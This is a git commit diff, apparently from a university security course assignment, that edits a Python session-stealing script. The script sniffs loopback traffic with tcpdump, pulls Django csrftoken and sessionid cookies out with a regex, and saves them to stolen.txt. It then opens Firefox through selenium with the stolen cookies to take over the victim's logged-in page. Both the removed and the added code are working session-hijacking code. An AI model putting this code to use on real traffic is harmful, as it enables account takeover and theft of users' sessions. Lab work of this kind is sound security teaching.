39d87520f93798417e00d996ae7b5350d7b00f31
Miriam Jańczak <229761@student.pwr.edu.pl>
2018-01-14 17:25:51 +0100

    List10-small fix

--- Security-List10/1/session_stealer.py
+++ Security-List10/1/session_stealer.py
@@ -10,11 +10,11 @@ port = '8000'
 url = 'http://'+host+':'+port
 secret_url = url + '/home'
 
-def steal(open_browser, save_sessions, filename=None):
+def steal():
     p = sub.Popen(('sudo', 'tcpdump', '-A', '-i', 'lo', 'host', host), stdout=sub.PIPE)
     sessions = []
     tokens = []
-    file = open(filename, 'a')
+    file = open("stolen.txt", 'a')
     for row in iter(p.stdout.readline, 'b'):
         line = str(row.rstrip())
         matchObj = re.search(r'csrftoken=(.*?); sessionid=(.*?)\'', line)
@@ -22,44 +22,16 @@ def steal(open_browser, save_sessions, filename=None):
             id = matchObj.group(2)
             token = matchObj.group(1)
             if id not in sessions:
-                if save_sessions:
-                    sessions.append(id)
-                    tokens.append(token)
-                    file.write(id + "\t" + token + "\n")
-                if open_browser:
-                    driver = selenium.webdriver.Firefox()
-                    driver.get(url)
-                    driver.add_cookie({"name": "csrftoken", 'value': token})
-                    driver.add_cookie({"name": "sessionid", 'value': id})
-                    driver.get(secret_url)
+                sessions.append(id)
+                tokens.append(token)
+                file.write(id + "\t" + token + "\n")
+                print("id: " + id + "\t" + "token: " + token + "\n")
+                driver = selenium.webdriver.Firefox()
+                driver.get(url)
+                driver.add_cookie({"name": "csrftoken", 'value': token})
+                driver.add_cookie({"name": "sessionid", 'value': id})
+                driver.get(secret_url)
 
-
-def load(filename, lineno=-1):
-    with open(filename, 'r') as f:
-        lines = f.read().splitlines()
-        line = lines[lineno].split('\t')
-        id = line[0]
-        token = line[1]
-        driver = selenium.webdriver.Firefox()
-        driver.get(url)
-        driver.add_cookie({"name": "csrftoken", 'value': token})
-        driver.add_cookie({"name": "sessionid", 'value': id})
-        driver.get(secret_url)
 
 if __name__ == "__main__":
-    parser = argparse.ArgumentParser()
-    parser.add_argument("--load", help="Load saved session from file.", action="store_true")
-    parser.add_argument("--listen", help="Search for new session to steal.", action="store_true")
-    parser.add_argument("--open", help="When session stolen open browser with it.", action="store_true")
-    parser.add_argument("--save", help="Save session tokens to file.", action="store_true")
-    parser.add_argument("--line", help="Number of line to read from file.", default=-1)
-    parser.add_argument("--file", help="Path to file.", default="sessions.txt")
-
-    if len(sys.argv) < 2:
-        parser.print_help()
-        sys.exit(1)
-    args = parser.parse_args()
-    if args.load:
-        load(args.file, args.line)
-    if args.listen:
-        steal(open_browser=args.open, save_sessions=args.save, filename=args.file)
+    steal()
